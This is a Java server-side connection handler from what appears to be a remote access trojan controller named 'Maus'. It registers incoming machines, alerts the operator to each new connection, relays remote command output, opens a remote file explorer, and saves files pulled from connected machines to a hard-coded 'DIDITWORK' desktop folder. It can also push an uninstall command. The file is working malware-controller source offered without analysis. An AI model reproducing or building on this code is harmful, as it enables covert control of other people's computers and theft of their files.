package Server;

import GUI.Controller;
import GUI.ResizeHelper;
import GUI.Views.FileExplorerView;
import GUI.Views.NotificationView;
import GUI.Views.SendCommandView;
import Logger.Level;
import Logger.Logger;
import Server.Data.PseudoBase;
import Server.Data.Repository;
import javafx.animation.PauseTransition;
import javafx.application.Platform;
import javafx.geometry.Rectangle2D;
import javafx.scene.Scene;
import javafx.stage.Screen;
import javafx.stage.Stage;
import javafx.stage.StageStyle;
import javafx.util.Duration;

import java.io.*;
import java.net.InetSocketAddress;
import java.net.Socket;

public class ClientHandler implements Runnable, Repository {
    private Socket socket;
    private PrintWriter clientOutput;
    private ClientObject client;

    ClientHandler(Socket socket) {
        this.socket = socket;
    }

    @Override
    public void run() {
        try (PrintWriter out = new PrintWriter(socket.getOutputStream())) {
            clientOutput = out;
            String ip = (((InetSocketAddress) Server.getClient().getRemoteSocketAddress()).getAddress()).toString().replace("/", "");
            /* Check to ensure there's room left via Max Connections setting. */
            if (CONNECTIONS.size() < ServerSettings.getMaxConnections()) {
                if (!CONNECTIONS.containsKey(ip)) {
                    client = new ClientObject(socket, "Maus Machine " + (PseudoBase.getMausData().size() + 1), ip);
                } else {
                    client = new ClientObject(socket, CONNECTIONS.get(ip).getNickName(), ip);
                }
                Platform.runLater(() -> PseudoBase.getMausData().put(ip, client));
            }
            Controller.updateStats();
            Platform.runLater(() -> {
                Stage stage = new Stage();
                stage.setWidth(300);
                stage.setHeight(100);
                Rectangle2D primaryScreenBounds = Screen.getPrimary().getVisualBounds();
                NotificationView notificationView = new NotificationView();
                stage.setScene(new Scene(notificationView.getNotificationView(), 300, 100));
                stage.setResizable(false);
                stage.setAlwaysOnTop(true);
                stage.setX(primaryScreenBounds.getMinX() + primaryScreenBounds.getWidth() - 300);
                stage.setY(primaryScreenBounds.getMinY() + primaryScreenBounds.getHeight() - 100);
                stage.initStyle(StageStyle.UNDECORATED);
                notificationView.getNotificationText().setText("New Connection: " + client.getIP());
                stage.show();
                PauseTransition delay = new PauseTransition(Duration.seconds(5));
                delay.setOnFinished(event -> stage.close());
                delay.play();
            });
            requestHandler();
        } catch (IOException e) {
            client.setOnlineStatus("Offline");
        }
    }

    /* Handles all requests from the client connection. */
    private void requestHandler() throws IOException {
        InputStream is = client.getClient().getInputStream();
        byte[] buffer = new byte[1024];
        int read;
        while ((read = is.read(buffer)) != -1) {
            String input = new String(buffer, 0, read);
            Logger.log(Level.INFO, "Received Command: " + input);
            if (input.contains("CMD")) {
                BufferedInputStream bis = new BufferedInputStream(client.getClient().getInputStream());
                DataInputStream dis = new DataInputStream(bis);
                int outputCount = dis.readInt();
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < outputCount; i++) {
                    sb.append(dis.readUTF()).append("\n");
                }
                dis.close();
                SendCommandView.getConsole().appendText(sb.toString());
            }
            if (input.contains("FILELIST")) {
                BufferedInputStream bis = new BufferedInputStream(client.getClient().getInputStream());
                DataInputStream dis = new DataInputStream(bis);
                String pathName = dis.readUTF();
                int filesCount = dis.readInt();
                String[] fileNames = new String[filesCount];
                for (int i = 0; i < filesCount; i++) {
                    fileNames[i] = dis.readUTF();
                }
                dis.close();
                Platform.runLater(() -> {
                    Stage stage = new Stage();
                    stage.setMinWidth(400);
                    stage.setMinHeight(400);
                    stage.initStyle(StageStyle.UNDECORATED);
                    stage.setScene(new Scene(FileExplorerView.getFileExplorerView(pathName, fileNames, stage), 900, 500));
                    ResizeHelper.addResizeListener(stage);
                    stage.show();
                });
            }
            if (input.contains("FILES")) {
                BufferedInputStream bis = new BufferedInputStream(client.getClient().getInputStream());
                DataInputStream dis = new DataInputStream(bis);
                int filesCount = dis.readInt();
                File[] files = new File[filesCount];
                for (int i = 0; i < filesCount; i++) {
                    long fileLength = dis.readLong();
                    String fileName = dis.readUTF();

                    files[i] = new File("C:/Users/caden/Desktop/DIDITWORK" + "/" + fileName);

                    FileOutputStream fos = new FileOutputStream(files[i]);
                    BufferedOutputStream bos = new BufferedOutputStream(fos);

                    for (int j = 0; j < fileLength; j++) bos.write(bis.read());

                    bos.close();
                }

                dis.close();
            }
            /* Uninstall and close remote server - remove from Maus */
            if (input.contains("forciblbyclose")) {
                client.clientCommunicate("forciblyclose");
                PseudoBase.getMausData().remove(client.getIP());
                CONNECTIONS.remove(client.getIP());
                Controller.updateStats();
                Controller.updateTable();
                client.getClient().close();
                client = null;
                break;
            }
        }
    }
}